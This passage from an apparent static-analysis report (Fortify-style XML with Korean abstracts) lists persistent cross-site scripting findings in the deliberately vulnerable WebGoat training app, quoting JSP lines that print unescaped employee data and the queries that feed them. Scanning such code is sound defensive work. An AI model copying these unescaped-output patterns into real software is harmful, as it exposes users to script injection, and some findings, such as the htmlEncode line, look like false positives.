                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="252290EA9C6689351A0BA503257BB069" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>236</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="64AAD646438E631626650ADEC378D054" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/Login.java</FilePath>
<LineStart>194</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="82628A37346FB478964720D1EC0A47A8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>67</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getCcn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D4382E7A58226D1AE494CE58F50AD5F7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DDE4ED8DE615B1C1BE02E6AFFB06597D" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="078CD7191ACCC1206F834EE82DFD9E11" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DBDB7A7D767D3FA501078F946FFB4F39" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="137E24447628B5A6D05DA15F899E6A87" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="513853D7DF5EB02F32D5CE93383B33E8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 21 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>21</LineStart>
<Snippet>						Last Name:					&lt;/TD&gt;
					&lt;TD width="196"&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
				  &lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8DE282D6C77F29B9B64734933D6E89B9" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 93 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>93</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C6EBCFAA0E0B0473639B9A23ACCD88D6" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ListStaff.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2CB9DDD9163879DCA3902BD190CEBC2A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9C5E64BA2D8983A133198A396D7F23FD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPersonalDescription()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5413D22854C32728027599C5BA8BB1E3" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 24 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>24</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0A7D1475C51DAB3A7C880BB469D14C21" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD colspan="3"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getPersonalDescription()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E649360F23D90C2780D4B3CDCAFC8D92" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9F9ADF805AD2CD4BF9E106B7528B8AA1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E2BE9CBE9F8DB25ACD4E49177E2AAF77" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 53 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>53</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0C993B8562E589C85A36503C332196AD" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6C1B06B946EF145BA7CC5F05A29FF332" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
